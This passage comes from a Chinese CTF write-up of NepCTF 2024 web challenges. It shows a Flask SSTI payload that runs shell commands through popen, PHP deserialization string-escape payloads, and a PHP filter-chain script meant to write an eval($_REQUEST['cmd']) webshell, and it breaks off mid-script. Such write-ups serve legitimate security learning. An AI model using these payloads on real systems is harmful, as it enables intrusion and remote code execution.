os.path.abspath(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])]) != os.path.abspath(<br>            app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file path.&#x27;</span><br><br>    <span class="hljs-keyword">if</span> os.path.islink(new_file):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        filename = file_path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]<br>        content = read_large_file(new_file)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;test.html&#x27;</span>, content=content, filename=filename, dates=Exec_date())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found.&#x27;</span><br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error reading file: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec_date</span>():<br>    d_res = os.popen(<span class="hljs-string">&#x27;date&#x27;</span>).read()<br>    <span class="hljs-keyword">return</span> d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>].strip() + <span class="hljs-string">&quot; &quot;</span> + d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">3</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_uploads_folder</span>():<br>    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], topdown=<span class="hljs-literal">False</span>):<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>            os.remove(os.path.join(root, file))<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:<br>            os.rmdir(os.path.join(root, <span class="hljs-built_in">dir</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_large_file</span>(<span class="hljs-params">file_path</span>):<br>    content = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            content += line<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-string">&quot;8000&quot;</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>关键点在<code> return render_template_string(&#39;&lt;br&gt;&#39;.join(files_list))</code></p><p>再看一下static可以进行ssti</p><p>直接命名文件名</p><p><code>&#123;&#123;''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()&#125;&#125;</code></p><p>通过修改<code>ls</code>这个位置，发现flag在上个目录，需要进行<code>cd..;cat flag</code>然后写个exp传入得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;https://neptune-16431.nepctf.lemonprefect.cn/&#x27;</span><br><span class="hljs-comment"># 上传带有恶意脚本的文件名</span><br>files = &#123;<span class="hljs-string">&quot;tp_file&quot;</span>:(<span class="hljs-string">&#x27;payload.zip&#x27;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read())&#125;<br>response = requests.post(url, files=files)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>可以得到flag</p><h2 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt;str;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&quot;00&quot;</span>,<span class="hljs-variable">$ser</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>类似这题其实已经是第三次了(第一次是黄河流域第二次是XGCTF),一直没仔细研究,趁着这次好好研究一下</p><p>先了解一下上方的字符串注入，这里就直接聊怎么做了，详细讲解可以去看gxngxngxn师傅的博客</p><p>%9f可以造成字符串往后移动一位，因为它不解析，%f0可以把字符串吞掉前三位</p><img src="/../../images/nepctf/2024/php1.png" alt="php1" style="zoom:80%;"><img src="/../../images/nepctf/2024/php2.png" alt="php2" style="zoom:80%;"><p>%f0配合任意的三个字符结合%9f就可以达到字符串逃逸</p><p>由此可以够造截取前面的内容，使$str&#x3D;NepCTF]</p><img src="/../../images/nepctf/2024/php3.png" alt="php3" style="zoom:80%;"><p>本题存在非预期解，先了解一下</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><strong>利用phpinfo(),读取flag</strong></p><p><code>$data = str_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser);</code>根据这条，字符变多逃逸，先构造后面的序列化得到的内容是<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</code>长度共47，将\0换成00多出一个字符，总共需要47个进行逃逸构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?nep1=%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep=Nep&amp;c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>搜索flag就可以得到了，应该是因为gzctf的特性造成非预期得到的flag</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-variable">$exp</span>-&gt;str=<span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$exp</span>-&gt;str-&gt;b=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">new</span> A,<span class="hljs-number">1</span>=&gt;<span class="hljs-string">&#x27;readflag&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-comment">#O:1:&quot;C&quot;:2:&#123;s:1:&quot;s&quot;;s:1:&quot;a&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br><span class="hljs-comment">#字符串有不可见</span><br></code></pre></td></tr></table></figure><p>截取需要的内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>再根据这段的长度进行字符串进行逃逸，得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;a:2:&#123;i:0;O:1:&quot;</span>A<span class="hljs-string">&quot;:1:&#123;s:3:&quot;</span>key<span class="hljs-string">&quot;;S:5:&quot;</span>\<span class="hljs-number">00</span>key\<span class="hljs-number">00</span><span class="hljs-string">&quot;;&#125;i:1;s:8:&quot;</span>readflag<span class="hljs-string">&quot;;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>再配上上面那段nep组成payload，接下来分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题看了一下可以通过filter_chain进行rce写入马，然后得到flag</p><p>这里借用晨曦师傅的exp得到马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$base64_payload</span> = <span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&quot;</span>; <span class="hljs-comment">/*&lt;?php <span class="hljs-doctag">@eval</span>($_REQUEST[&#x27;cmd&#x27;]);?&gt;*/</span><br><span class="hljs-variable">$conversions</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;/&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;2&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,<br>    <span class="hljs-string">&#x27;3&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;5&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,<br><span class="hljs-string">&#x27;6&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;A&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,<br>    <span class="hljs-string">&#x27;F&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;G&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,<br>    <span class="hljs-string">&#x27;H&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;I&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;J&#x27;</span> =&gt; <span 